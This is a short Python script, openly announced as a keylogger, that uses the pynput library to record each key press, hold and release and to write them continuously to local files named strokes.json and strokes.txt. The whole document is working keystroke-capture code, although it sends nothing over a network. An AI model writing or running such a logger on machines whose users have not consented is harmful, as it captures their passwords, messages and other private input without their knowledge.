from pynput import keyboard
import json

key_list = []
flag = False
key_strokes = ""

def on_press(key):
    global flag, key_list
    if flag == False:
        key_list.append({'Pressed' : f'{key}'})
        flag = True

    if flag == True:
        key_list.append({'Held' : f'{key}'})

    update_json(key_list)

def on_release(key):
    global flag, key_list, key_strokes
    key_list.append({'Released' : f'{key}'})
    
    if flag == True:
        flag = False

    update_json(key_list)
    key_strokes = key_strokes + str(key)
    update_txt(str(key_strokes))


def update_json(key_list):
    with open('strokes.json', '+wb') as keystrokes:
        key_list_bytes = json.dumps(key_list).encode()
        keystrokes.write(key_list_bytes)

def update_txt(key):
    with open('strokes.txt', 'w+') as key_stroke:
        key_stroke.write(key)

print("[+] Keylogger Running.")
print("...storing key strokes into strokes.json")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

